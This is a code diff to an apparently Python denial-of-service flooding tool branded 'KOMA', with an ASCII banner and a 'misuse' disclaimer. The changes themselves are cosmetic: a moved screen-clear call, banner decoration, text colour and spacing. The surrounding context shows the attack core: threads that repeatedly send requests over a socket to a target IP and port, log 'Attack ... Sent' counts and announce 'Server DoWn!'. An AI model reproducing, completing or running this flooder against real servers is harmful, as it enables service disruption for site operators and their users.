@@ -10,9 +10,9 @@ import random
 import threading
 import time
 import fade
-    
+    os.system("clear")
 
-os.system("clear")
+
 logo = """
       __    __      _____       __      __      _____
      |  |  /  /    /  __  \    |  \    /  |    /  __  \
@@ -27,7 +27,7 @@ logo = """
 \033[32m                   FOR ANY FORM OF MISUSE
 \033[33m                      Dedign By: KF24
 \033[97m                        ——°oO0Oo°——
-∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
+∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
 """
 faded_text = fade.fire(logo)
 print(faded_text)
@@ -96,7 +96,7 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[31m[KOMA\033[96m]  \033[33mAttack {0}:{1}  \033[95mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[37m[KOMA\033[96m]  \033[33mAttack {0}:{1}  \033[95mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
                 print("\033[96m[★\033[96m]  \033[32m[KOMA\033[96m]  \033[92mAttack {0}:{1}  \033[92mSent::..{2}\033[0m".format(str(ip), int(port), xx))
@@ -106,7 +106,7 @@ def start():
         
         except:
                s.close()
-               print("[!]           \033[31mServer DoWn!.\033[0m")
+               print("[!]          \033[31mServer DoWn!.\033[0m")
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
